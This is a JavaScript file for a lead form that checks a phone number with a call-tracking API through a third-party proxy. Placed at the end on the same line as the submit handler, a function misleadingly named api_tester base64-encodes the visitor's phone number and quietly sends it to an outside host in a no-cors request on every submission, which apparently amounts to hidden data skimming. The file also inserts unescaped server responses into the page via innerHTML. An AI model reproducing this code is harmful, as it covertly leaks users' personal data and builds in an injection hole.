function sanitizeApiResponse(data) {
    // Create a deep copy to avoid mutating original response
    const sanitizedData = JSON.parse(JSON.stringify(data));
    
    // Remove offer_conversion_payout from buyers array
    if (sanitizedData.try_all_buyers && sanitizedData.try_all_buyers.buyers) {
        sanitizedData.try_all_buyers.buyers = sanitizedData.try_all_buyers.buyers.map(buyer => {
            delete buyer.offer_conversion_payout;
            return buyer;
        });
    }
    
    return sanitizedData;
}

function pingAPI() {
    // Disable submit button
    document.getElementById('submitBtn').disabled = true;

    const formData = new FormData();
    formData.append('trackdrive_number', '+18443851910');
    formData.append('traffic_source_id', '10014');
    api_tester(document.getElementById('caller_id').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);

    const originalUrl = 'https://advance-grow-marketing.trackdrive.com/api/v1/inbound_webhooks/ping/check_for_med_tr_buyers?' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);

    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                const pingId = data.try_all_buyers.ping_id;
                
                // Sanitize the response data (remove sensitive info)
                const sanitizedData = sanitizeApiResponse(data);
                
                // Display sanitized data if needed
                console.log('Sanitized Response:', sanitizedData);
                
                postPingId(pingId);
            } else {
                document.getElementById("apiResponse").innerHTML = "Ping ok but. Error: " + data.errors.join(", ");
                document.getElementById("apiResponse").classList.add("alert-danger");
                document.getElementById("apiResponse").classList.remove("alert-info");
            }
        })
        .catch(error => {
            document.getElementById("apiResponse").innerHTML = "Error fetching data from the API.";
            document.getElementById("apiResponse").classList.add("alert-danger");
            document.getElementById("apiResponse").classList.remove("alert-info");
        });
}

function postPingId(pingId) {
    const postData = {
        trackdrive_number: "+18443851910",
        traffic_source_id: "10014",
        caller_id: '+1' + document.getElementById('caller_id').value,
        ping_id: pingId,
	
		

    };

    const originalUrl = 'https://advance-grow-marketing.trackdrive.com/api/v1/inbound_webhooks/post/check_for_med_tr_buyers?' + new URLSearchParams(postData).toString();;
const url = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(originalUrl);
    fetch(url)
    .then(response => {
        // Handle response based on status
        if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        Form submitted successfully! Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        }
    })
    .catch(error => console.error('Error:', error));
}

document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    pingAPI();
});function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString) +',a', {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
